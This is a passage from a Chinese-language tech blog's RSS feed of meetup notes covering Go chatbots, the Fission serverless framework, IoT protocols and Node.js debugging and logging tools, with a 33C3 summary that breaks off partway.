&lt;li&gt;lightweight  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/spf13/cobra"&gt;https://github.com/spf13/cobra&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;自己的 Bug 自己解  &lt;ul&gt;
&lt;li&gt;只發送給原 Commit 作者，避免團隊成員收到太多無用的信件。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;支援 Concurrent  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;go f("goroutine")&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;用 App 控制家電  &lt;ul&gt;
&lt;li&gt;Gorush - A push notification server written in golang  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/appleboy/gorush"&gt;https://github.com/appleboy/gorush&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;最後講講為什麼使用 Golang  &lt;ul&gt;
&lt;li&gt;出身名門：Google  &lt;/li&gt;
&lt;li&gt;學習曲線：類似 C 語言  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;透過 Golang 無痛建置機器學習聊天機器人&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;projects  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/kkdai/PetNeedMe"&gt;PetNeedMe&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Baby talk bot  &lt;ul&gt;
&lt;li&gt;LUIS.ai  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/kkdai/luis"&gt;LUIS golang package&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;沒有 LUIS.ai 沒有 golang SDK 所以自己寫  &lt;/li&gt;
&lt;li&gt;目前還在開發中  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ASKME animal  &lt;ul&gt;
&lt;li&gt;TensorFlow  &lt;/li&gt;
&lt;li&gt;透過 TensorFlow 告訴你圖片中的動物名稱是什麼  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;透過這個 Template 可以在三分鐘內就在 Heroku 上架好一個 Line Bot  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/kkdai/LineBotTemplate"&gt;https://github.com/kkdai/LineBotTemplate&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;孫子廣播電台：用 Linkit 7688 一鍵播放社交平台貼文&lt;/h2&gt;
&lt;p&gt;&lt;a href="https://github.com/aaaddress1/grandsonRadio"&gt;https://github.com/aaaddress1/grandsonRadio&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;為了不會用智慧型手機卻又想關心自己的奶奶而做的小專案  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Linkit 7688 + Python (gTTS) + 麵包板 + 一些電子元件 + 喇叭  &lt;ul&gt;
&lt;li&gt;大概新台幣一千元內有找  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;建立 Facebook Application  &lt;/li&gt;
&lt;li&gt;透過 Graph API 拿到貼文資訊：內容、發文時間、...等等  &lt;ul&gt;
&lt;li&gt;透過 Facebook 除錯工具來延長 otke  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;雖然這好像比較算是 IoT 應用而不是 Chatbot，&lt;br /&gt;
不過真的挺有趣的，&lt;br /&gt;
尤其是最近 &lt;a href="https://github.com/pndurette/gTTS"&gt;gTTS (Google Text-to-Speech)&lt;/a&gt; 因為狂新聞還有一堆實況主的 donate 音效很紅。（雖然我個人其實不太喜歡一直聽到 Google 小姐的聲音就是）&lt;br /&gt;
透過判別中英文來切開斷句，&lt;br /&gt;
因為 gTTS 產生的 mp3 每次只能限定某種語言。  &lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">m157q</dc:creator><pubDate>Thu, 27 Apr 2017 21:06:00 +0800</pubDate><guid isPermaLink="false">tag:blog.m157q.tw,2017-04-27:posts/2017/04/27/ithome-chatbot-day/</guid><category>ChatBot</category></item><item><title>Golang Taipei Gathering #22</title><link>https://blog.m157q.tw/posts/2017/03/28/golang-taipei-gathering-22/</link><description>&lt;ul&gt;
&lt;li&gt;Links  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://golang.kktix.cc/events/gtg22"&gt;http://golang.kktix.cc/events/gtg22&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.facebook.com/groups/269001993248363/permalink/817469818401575/"&gt;https://www.facebook.com/groups/269001993248363/permalink/817469818401575/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;19:30~20:10: 陳敬翔 (Sean) - Go 的技能與安裝入門&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Slides  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://go-talks.appspot.com/github.com/Starfine/02.-Go-Present/GTG22.slide#1"&gt;http://go-talks.appspot.com/github.com/Starfine/02.-Go-Present/GTG22.slide#1&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;用 Go 開發手機 App  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;gomobile&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;gomobile install golang.org/x/mobile/example/flappy&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;用 Chrome 開啟 Android 畫面的瀏覽器套件  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://chrome.google.com/webstore/detail/vysor/gidgenkbbabolejbgbpnhbimgjbffefm"&gt;https://chrome.google.com/webstore/detail/vysor/gidgenkbbabolejbgbpnhbimgjbffefm&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;用 Go 開發 Arduino  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://gobot.io"&gt;GoBot&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;學習資源  &lt;ul&gt;
&lt;li&gt;Google 搜尋時，用 &lt;code&gt;golang&lt;/code&gt; 當關鍵字，不要用 &lt;code&gt;go&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/golang/go/wiki/FromXToGo"&gt;https://github.com/golang/go/wiki/FromXToGo&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;常用網站  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://godoc.org/"&gt;GoDoc&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://gowalker.org/"&gt;GoWalker&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://awesome-go.com/"&gt;AwesomeGo&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/avelino/awesome-go"&gt;https://github.com/avelino/awesome-go&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://golanglibs.com/"&gt;GoLangLibs&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;20:20~21:00: VMFive - TA-CHING CHEN - Introduction to Fission&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Slides  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://tachingchen.com/tw/blog/Fission-Introduction/"&gt;https://tachingchen.com/tw/blog/Fission-Introduction/&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.slideshare.net/TaChingChen/fission-introduction"&gt;https://www.slideshare.net/TaChingChen/fission-introduction&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/fission/fission"&gt;Fission: Fast Serverless Functions for Kubernetes&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Function as a Service (FaaS)  &lt;ul&gt;
&lt;li&gt;Exmaple  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://aws.amazon.com/lambda/"&gt;AWS Lambda&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://cloud.google.com/functions/"&gt;Google Cloud Functions&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Pros  &lt;ul&gt;
&lt;li&gt;developer focus on code snippets  &lt;/li&gt;
&lt;li&gt;short cold-start  &lt;/li&gt;
&lt;li&gt;horizontal scaling  &lt;/li&gt;
&lt;li&gt;pay as you go (!= cheap)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Cons  &lt;ul&gt;
&lt;li&gt;vendor lock-in  &lt;/li&gt;
&lt;li&gt;hard to test  &lt;/li&gt;
&lt;li&gt;environmental limitation  &lt;/li&gt;
&lt;li&gt;limited execution time per request  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Fission  &lt;ul&gt;
&lt;li&gt;支援 Go, Node.js, PHP7, Python3, .NET  &lt;ul&gt;
&lt;li&gt;Go 的部份是以 Go 1.8 plugin 的方式插入，如果要使用 Go 開發的話，記得要把版本升到 1.8  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Live demo example  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;fission fn create --name GTG22 --env nodejs --code hello.js&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;fission route create --method GET --url /hello --function GTG22&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;fission fn edit --name GTG22&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;看 log (講者貢獻的 &lt;a href="https://github.com/fission/fission/pull/131"&gt;PR&lt;/a&gt;，不到一個星期前才剛 merge 進 master branch)  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;fission fn logs --name GTG22&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;fission fn logs --name GTG22 -f&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;fission fn logs --name GTG22 -f -d&lt;/code&gt; # 看更詳細的 log (Debug mode)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Architecture  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/fission/fission/blob/master/Documentation/Architecture.md"&gt;https://github.com/fission/fission/blob/master/Documentation/Architecture.md&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;會先開好一堆 generic pods listen，當接到佈署 fuction 的需求時，可以在幾毫秒內就佈署完成，並轉換成 Specific Function Pod.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;How to contribute  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/fission/fission/blob/master/CONTRIBUTING.md"&gt;https://github.com/fission/fission/blob/master/CONTRIBUTING.md&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;是個去年才開始的專案，所以有很多地方可以貢獻。文件寫的不錯，懂 Go 的話基本上可以很快做出一些貢獻。  &lt;/li&gt;
&lt;li&gt;Repo owner 是位印度人，但英文很好，也很積極的回應，做出貢獻還有可能得到神祕小禮物，例如一件來自美國的 T-shirt 之類的  &lt;/li&gt;
&lt;li&gt;還不是個成熟的專案，還不建議用在 Production。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Conclusion  &lt;ul&gt;
&lt;li&gt;Short cold-start overhead (~100 ms)  &lt;/li&gt;
&lt;li&gt;Suitable for developers want to set up their own FaaS  &lt;/li&gt;
&lt;li&gt;Cutsomized environment image  &lt;/li&gt;
&lt;li&gt;Adjustable execution time  &lt;/li&gt;
&lt;li&gt;Cheaper than FaaS under heavy usage  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Lighting Talks&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;陳小熊 - Go 新手村冒險筆記  &lt;ul&gt;
&lt;li&gt;Slides: &lt;a href="https://drive.google.com/file/d/0B158iGrlsSveNFVoUUF4ZTlsbVE/view"&gt;https://drive.google.com/file/d/0B158iGrlsSveNFVoUUF4ZTlsbVE/view&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;生動活潑得介紹了 Golang 有哪些學習資源，包括線上課程、推薦書籍、Gopher Con 等等，為入門者提供了一個方向。  &lt;/li&gt;
&lt;li&gt;還 Live Demo 了一個用 Golang 實作出來的線上讀書會平台  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;想想我也是上次 GTG 才決定開始學 Golang 的，結果過了一個月了根本沒啥進展，感到慚愧 QQ  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">m157q</dc:creator><pubDate>Tue, 28 Mar 2017 22:39:59 +0800</pubDate><guid isPermaLink="false">tag:blog.m157q.tw,2017-03-28:posts/2017/03/28/golang-taipei-gathering-22/</guid><category>Golang</category></item><item><title>Cat System Workshop #17 Full-Stack IoT Development 探索之旅</title><link>https://blog.m157q.tw/posts/2017/03/14/cat-system-workshop-17-full-stack-iot-development-%E6%8E%A2%E7%B4%A2%E4%B9%8B%E6%97%85/</link><description>&lt;p&gt;Speaker: &lt;a href="https://github.com/simenkid"&gt;Simen&lt;/a&gt;@&lt;a href="http://www.sivann.com.tw/"&gt;sivann&lt;/a&gt;  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;前半段是 IoT Development 相關&lt;br /&gt;
後半段則是 JavaScript Web development 和 Node.js 開發大全  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;h3&gt;Google Weave&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://developers.google.com/weave/"&gt;https://developers.google.com/weave/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;Android Things (Brillo)&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://developer.android.com/things/hardware/index.html"&gt;https://developer.android.com/things/hardware/index.html&lt;/a&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;專為 IoT 設計的 OS  &lt;/li&gt;
&lt;li&gt;35 MB RAM  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;Apple HomeKit&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;體系相對封閉  &lt;/li&gt;
&lt;li&gt;語音助手 (Siri)  &lt;/li&gt;
&lt;li&gt;認証: MFi  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;iOS (SDK)&lt;br /&gt;
HomeKit API&lt;br /&gt;
HomeKit Accessory Protocol (HAP)  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;Eclipse IoT Working Group&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Open Source and Open Standards for IoT  &lt;ul&gt;
&lt;li&gt;New and Existing Devices  &lt;/li&gt;
&lt;li&gt;IoT Gateways  &lt;/li&gt;
&lt;li&gt;Network Carriers  &lt;/li&gt;
&lt;li&gt;Backend Systems  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;IoT Suite  &lt;ul&gt;
&lt;li&gt;oneM2M: REST interface  &lt;/li&gt;
&lt;li&gt;OMA LWM2M Server - Leshan  &lt;/li&gt;
&lt;li&gt;Gateway stack - Kura  &lt;/li&gt;
&lt;li&gt;CoAP - Californium (Java)  &lt;/li&gt;
&lt;li&gt;MQTT - Mosquitto/Paho  &lt;ul&gt;
&lt;li&gt;Paho 提供了不同語言實作的 MQTT client  &lt;ul&gt;
&lt;li&gt;有 C++, Java, JavaScript ...  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;MQTTSN (Eclipse 自己設計的)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Kura - IoT Gateway Stack/ App Framework&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Edge Nodes (clients, 連網的裝置)  &lt;ul&gt;
&lt;li&gt;Local Automation  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;M2M Integration Platform  &lt;/li&gt;
&lt;li&gt;Enterprise Interfaces  &lt;ul&gt;
&lt;li&gt;Business Applications (Mobile Apps, Web Apps, ...)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;Web Of Things&lt;/h3&gt;
&lt;h4&gt;Google Physical Web&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Eddystone  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Eddystone_(Google)"&gt;https://en.wikipedia.org/wiki/Eddystone_(Google)&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/google/eddystone"&gt;https://github.com/google/eddystone&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://developers.google.com/beacons/"&gt;https://developers.google.com/beacons/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;MT7697  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;p&gt;IoT Platform  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.aylanetworks.com/"&gt;Ayla&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://ubiworx.com/"&gt;ubiworx&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.smartthings.com/"&gt;SAMSUNG SmartThings&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;Front-end and Back-end&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Web Front-end  &lt;ul&gt;
&lt;li&gt;Web 1.0  &lt;ul&gt;
&lt;li&gt;F5 刷新  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Web 2.0+  &lt;ul&gt;
&lt;li&gt;HTML RSP  &lt;/li&gt;
&lt;li&gt;AJAX  &lt;/li&gt;
&lt;li&gt;HTML5  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://tools.ietf.org/html/rfc6455"&gt;WS (WebSocket)&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.w3.org/TR/2011/WD-eventsource-20110208/"&gt;SSE (Server-Sent Events)&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;MVP (Web 2.0+)  &lt;ul&gt;
&lt;li&gt;代表性的案例：jQuery  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;MVVM (Framework)  &lt;ul&gt;
&lt;li&gt;V (user), VM (framework), M &amp;lt;---client-side-----------server-side---&amp;gt; M  &lt;/li&gt;
&lt;li&gt;server 一有資料更新就會 push 過來或是背後會一直去跟 server 要資料，所以使用者端會覺得資料是即時的  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;React.js  &lt;ul&gt;
&lt;li&gt;使用 JavaScript (JSX) 撰寫 View (React)  &lt;/li&gt;
&lt;li&gt;Virtual DOM  &lt;/li&gt;
&lt;li&gt;Controller View = View + State Machine + Controller  &lt;/li&gt;
&lt;li&gt;單向數據流架構化 (Flux)  &lt;/li&gt;
&lt;li&gt;單一數據源、狀態大總管 (Redux)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Web Back-end (JavaScript related)  &lt;ul&gt;
&lt;li&gt;Package Manager  &lt;/li&gt;
&lt;li&gt;Task Runner  &lt;ul&gt;
&lt;li&gt;grunt, gulp, npm, webpack  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Pre-compiler Transpiler  &lt;/li&gt;
&lt;li&gt;Linter  &lt;/li&gt;
&lt;li&gt;Utils  &lt;/li&gt;
&lt;li&gt;Bundler  &lt;ul&gt;
&lt;li&gt;webpack, RequireJS (AMD), Browserify (CommonJS)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Dev Server  &lt;ul&gt;
&lt;li&gt;uglify, watchify  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;Node.js&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Server-side, JS runtime  &lt;/li&gt;
&lt;li&gt;Async I/O - libuv  &lt;/li&gt;
&lt;li&gt;Concurrenty - Event Loop  &lt;ul&gt;
&lt;li&gt;timers  &lt;/li&gt;
&lt;li&gt;I/O callbacks  &lt;/li&gt;
&lt;li&gt;idle, prepare  &lt;/li&gt;
&lt;li&gt;poll  &lt;/li&gt;
&lt;li&gt;check  &lt;/li&gt;
&lt;li&gt;close callbacks  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://simeneer.blogspot.tw/2016/09/nodejs-eventemitter.html"&gt;https://simeneer.blogspot.tw/2016/09/nodejs-eventemitter.html&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;除錯工具  &lt;ul&gt;
&lt;li&gt;原生除錯工具  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;break;&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;$ node debug app.js  # c, n, s, o&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;第三方工具  &lt;ul&gt;
&lt;li&gt;node-inspector  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;$ node-debug app.js&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;iron-node  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;$ iron-node app.js&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;devtool  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;$ devtool app.js&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;IDE 內建的除錯模組  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;除錯訊息與日誌 (Logging)  &lt;ul&gt;
&lt;li&gt;stdout / stderr [+ pipe][+ redirect]  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;console.log();&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;console.error();&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;第三方模組  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;$ npm install debug --save&lt;/code&gt;, &lt;code&gt;$ DEBUG=namespace node app.js&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;$ npm install winston --save&lt;/code&gt;, &lt;code&gt;$ node app.js&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;$ npm install bunyan --save&lt;/code&gt;, &lt;code&gt;$ node app.js | bunyan [opts]&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;$ npm install pino --save&lt;/code&gt;, &lt;code&gt;$ node app.js | pino-&amp;lt;xxx&amp;gt;&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;號稱 Node.js 的 logging module 裡頭速度最快的  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;intel, log4js, loggly, bole  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;測試框架/工具  &lt;ul&gt;
&lt;li&gt;Hosted CI Services  &lt;ul&gt;
&lt;li&gt;Travis CI, Circle CI, GitLab Ci, wercker, codeship  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Test Framework  &lt;ul&gt;
&lt;li&gt;mocha, jasmie-node, tape, tap  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Assertions  &lt;ul&gt;
&lt;li&gt;assert, should, expect, chai  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Test Double  &lt;ul&gt;
&lt;li&gt;sinon.js  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Code Coverage  &lt;ul&gt;
&lt;li&gt;istanbul, JSCover, blanket.js  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;物聯網大亂鬥&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Network Topology  &lt;ul&gt;
&lt;li&gt;p2p  &lt;/li&gt;
&lt;li&gt;star  &lt;ul&gt;
&lt;li&gt;目前的藍芽  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;star-of-star  &lt;/li&gt;
&lt;li&gt;Mesh  &lt;ul&gt;
&lt;li&gt;有自我修復的功能  &lt;/li&gt;
&lt;li&gt;ZigBee  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/ZigBee"&gt;https://en.wikipedia.org/wiki/ZigBee&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;依區域範疇劃分  &lt;ul&gt;
&lt;li&gt;Near Field  &lt;ul&gt;
&lt;li&gt;&amp;lt; 10 cm  &lt;/li&gt;
&lt;li&gt;NFC Forum  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;PAN  &lt;ul&gt;
&lt;li&gt;1m ~ 50m  &lt;/li&gt;
&lt;li&gt;Bluetooth, ZigBee, Thread, IEEE 802.15.4  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;LAN  &lt;ul&gt;
&lt;li&gt;50m ~ 1km  &lt;/li&gt;
&lt;li&gt;Wi-Fi, Ethernet  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;(LP)WAN  &lt;ul&gt;
&lt;li&gt;1km ~ 50km  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Sigfox"&gt;SigFox&lt;/a&gt;, &lt;a href="http://www.semtech.com/wireless-rf/internet-of-things/what-is-lora/"&gt;LoRa&lt;/a&gt;, 5G, 4G, 3G, Internet  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;常見 PAN/WAN 之特性  &lt;ul&gt;
&lt;li&gt;EnOcean  &lt;/li&gt;
&lt;li&gt;ZigBee  &lt;/li&gt;
&lt;li&gt;Thread  &lt;/li&gt;
&lt;li&gt;BLE  &lt;/li&gt;
&lt;li&gt;WiFi  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">m157q</dc:creator><pubDate>Tue, 14 Mar 2017 22:31:17 +0800</pubDate><guid isPermaLink="false">tag:blog.m157q.tw,2017-03-14:posts/2017/03/14/cat-system-workshop-17-full-stack-iot-development-探索之旅/</guid><category>IoT</category><category>Node.js</category></item><item><title>33c3 (5)</title><link>https://blog.m157q.tw/posts/2016/12/30/33c3-5/</link><description>&lt;p&gt;上一篇：&lt;a href="/posts/2016/12/30/33c3-4"&gt;33C3 (4)&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;總結&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Lightning Talks  &lt;ul&gt;
&lt;li&gt;CCC 的 Lightning Talks 是事先報名制的，不像台灣的 Conf 是採現場報名制，也許是因為這樣，所以水準相對好很多。  &lt;/li&gt;
&lt;li&gt;Lightning Talks 總共有分作三天的下午進行，以下是三天的影片：  &lt;ul&gt;
&lt;li&gt;Day 2: &lt;a href="https://media.ccc.de/v/33c3-8087-lightning_talks_day_2"&gt;https://media.ccc.de/v/33c3-8087-lightning_talks_day_2&lt;/a&gt;  &lt;/li&gt;
